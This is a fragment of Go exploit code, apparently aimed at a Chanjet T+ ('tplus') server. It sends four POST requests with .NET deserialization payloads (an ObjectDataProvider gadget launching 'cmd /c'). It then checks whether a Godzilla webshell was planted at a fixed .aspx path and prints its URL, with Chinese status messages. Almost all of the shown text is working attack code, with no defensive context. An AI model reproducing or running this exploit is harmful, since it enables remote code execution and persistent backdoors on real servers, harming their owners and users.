			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc2 + `"
				}
			}
		}
	}`)
	data3 := fmt.Sprintf(`{
		"storeID": {
			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
			"MethodName": "Start",
			"ObjectInstance": {
				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
				"StartInfo": {
					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
					"FileName": "cmd",
					"Arguments": "/c  ` + poc3 + `"
				}
			}
		}
	}`)
	req, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data)))
	req1, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data1)))
	req2, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data2)))
	req3, _ := http.NewRequest("POST", vulurl, bytes.NewBuffer([]byte(data3)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (WindOW5 NT 10,0; Win64; x64; rv:71.0) Gecko/28100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	Client := http.Client{}
	Client.Do(req)
	Client.Do(req1)
	Client.Do(req2)
	Client.Do(req3)
	webshellurl := target + "/tplus/53439404fae74175.aspx?preload=1"
	if getStatusCode(webshellurl) == 200 {
		fmt.Println("[+]webshell: " + webshellurl + "哥斯拉默认\n")
	} else {
		fmt.Println("[-]：喵的没成功")
		fmt.Println("[-]网络波动问题，尝试访问webshell: " + webshellurl + "哥斯拉默认\n")
	}

}
